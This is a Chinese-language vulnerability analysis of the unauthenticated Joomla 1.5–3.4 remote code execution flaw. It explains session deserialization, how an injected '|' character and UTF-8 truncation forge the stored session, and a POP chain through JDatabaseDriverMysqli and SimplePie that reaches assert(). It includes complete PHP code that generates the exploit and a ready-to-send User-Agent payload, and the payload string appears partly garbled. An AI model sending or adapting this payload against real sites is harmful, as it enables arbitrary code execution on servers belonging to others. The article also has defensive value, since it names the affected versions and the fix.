# Joomla远程代码执行漏洞分析

说一下这个漏洞的影响和触发、利用方法。这个漏洞影响Joomla 1.5 to 3.4全版本，并且利用漏洞无需登录，只需要发送两次数据包即可（第一次：将session插入数据库中，第二次发送同样的数据包来取出session、触发漏洞、执行任意代码），后果是直接导致任意代码执行。

0x00 漏洞点 —— 反序列化session
=======================

* * *

这个漏洞存在于反序列化session的过程中。

漏洞存在于`libraries/joomla/session/session.php`中，_validate函数，将ua和xff调用set方法设置到了session中（`session.client.browser和session.client.forwarded`）

```
protected function _validate($restart = false)
    {
        ...

        // Record proxy forwarded for in the session in case we need it later
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $this->set('session.client.forwarded', $_SERVER['HTTP_X_FORWARDED_FOR']);
        }

        ...
        // Check for clients browser
        if (in_array('fix_browser', $this->_security) && isset($_SERVER['HTTP_USER_AGENT']))
        {
            $browser = $this->get('session.client.browser');

            if ($browser === null)
            {
                $this->set('session.client.browser', $_SERVER['HTTP_USER_AGENT']);
            }
            elseif ($_SERVER['HTTP_USER_AGENT'] !== $browser)
            {
                // @todo remove code: $this->_state = 'error';
                // @todo remove code: return false;
            }

```

最终跟随他们俩进入数据库，session表：

![](http://drops.javaweb.org/uploads/images/98ecd52ab8d975876b34e38af75bf2dcb4768fc6.jpg)

正常情况下，不存在任何问题。因为我们控制的只是反序列化对象中的一个字符串，不会触发反序列相关的漏洞。 但是，因为一个小姿势，导致后面我们可以控制整个反序列化对象。

0x01 利用|字符伪造，控制整个反序列化字符串
========================

* * *

首先，我们需要先看看@Ryat老师的pch-013：`https://github.com/80vul/phpcodz/blob/master/research/pch-013.md`  
和pch-013中的情况类似，joomla也没有采用php自带的session处理机制，而是用多种方式（包括database、memcache等）自己编写了存储session的容器（storage）。

其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值』，未正确处理多个竖线的情况。  
那么，我们这里就可以通过注入一个"|"符号，将它前面的部分全部认为是name，而|后面我就可以插入任意serialize字符串，构造反序列化漏洞了。

![](http://drops.javaweb.org/uploads/images/5aef4e14e6ddf6ed908d0bd51a507c9755187879.jpg)

但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像SQL注入，还有注释符可用。 不知各位是否还记得当年wordpress出过的一个[XSS](http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html)，当时就是在插入数据库的时候利用"%F0%9D%8C%86"字符将mysql中utf-8的字段截断了。

这里我们用同样的方法，在session进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。

0x02 构造POP执行链，执行任意代码
====================

* * *

在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。 exp构造的执行链，分别利用了如下类：

1.  JDatabaseDriverMysqli
2.  SimplePie

我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：

```
    public function __destruct()
    {
        $this->disconnect();
    }
    ...
    public function disconnect()
    {
        // Close the connection.
        if ($this->connection)
        {
            foreach ($this->disconnectHandlers as $h)
            {
                call_user_func_array($h, array( &$this));
            }

            mysqli_close($this->connection);
        }

        $this->connection = null;
    }

```

当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用`__destruct`，`__destruct`将会调用`disconnect`，`disconnect`里有一处敏感函数：`call_user_func_array`。  
但很明显，这里的`call_user_func_array`的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。  
于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数`[new SimplePie(), 'init']`，传入`call_user_func_array`。 跟进init方法：

```
function init()
    {
        // Check absolute bare minimum requirements.
        if ((function_exists('version_compare') && version_compare(PHP_VERSION, '4.3.0', '<')) || !extension_loaded('xml') || !extension_loaded('pcre'))
        {
            return false;
        }
        ...
        if ($this->feed_url !== null || $this->raw_data !== null)
        {
            $this->data = array();
            $this->multifeed_objects = array();
            $cache = false;

            if ($this->feed_url !== null)
            {
                $parsed_feed_url = SimplePie_Misc::parse_url($this->feed_url);
                // Decide whether to enable caching
                if ($this->cache && $parsed_feed_url['scheme'] !== '')
                {
                    $cache = call_user_func(array($this->cache_class, 'create'), $this->cache_location, call_user_func($this->cache_name_function, $this->feed_url), 'spc');
                }

```

很明显，其中这两个call_user_func将是触发代码执行的元凶。 所以，我将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。  
所以，exp是怎么生成的？给出我写的生成代码：

```
<?php
//header("Content-Type: text/plain");
class JSimplepieFactory {
}
class JDatabaseDriverMysql {

}
class SimplePie {
    var $sanitize;
    var $cache;
    var $cache_name_function;
    var $javascript;
    var $feed_url;
    function __construct()
    {
        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
        $this->javascript = 9999;
        $this->cache_name_function = "assert";
        $this->sanitize = new JDatabaseDriverMysql();
        $this->cache = true;
    }
}

class JDatabaseDriverMysqli {
    protected $a;
    protected $disconnectHandlers;
    protected $connection;
    function __construct()
    {
        $this->a = new JSimplepieFactory();
        $x = new SimplePie();
        $this->connection = 1;
        $this->disconnectHandlers = [
            [$x, "init"],
        ];
    }
}

$a = new JDatabaseDriverMysqli();
echo serialize($a);

```

![](http://drops.javaweb.org/uploads/images/1b4060fa6fc09a6c592dca3eabc9084330f474d5.jpg)

将这个代码生成的exp，以前面提到的注入`『|』`的变换方式，带入前面提到的user-agent中，即可触发代码执行。 其中，我们需要将`char(0)*char(0)`替换成`\0\0\0`，因为在序列化的时候，protected类型变量会被转换成`\0*\0name`的样式，这个替换在源代码中也可以看到：

```
$result = str_replace('\0\0\0', chr(0) . '*' . chr(0), $result);

```

构造的时候遇到一点小麻烦，那就是默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：

![](http://drops.javaweb.org/uploads/images/fe67cff8b19f9060db13c303afb7a9929c35d21b.jpg)

而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。 给出我最终构造的POC（既是上诉php代码生成的POC）：

```
User-Agent: 123}__test|O:21:"JDatabaseDriverMysqli":3:{s:4:"\0\0\0a";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:37:"ρhιτhσπpinfo();JFactory::getConfig();exit;";}i:1;s:4:"init";}}s:13:"\0\0\0connection";i:1;}ð

```

给一张代码成功执行的POC：

![](http://drops.javaweb.org/uploads/images/c8b42fc5fbe05e64a6e025882aa4f34289ad6589.jpg)

0x03 影响版本 & 修复方案
================

1.5 to 3.4全版本

更新到3.4.6版本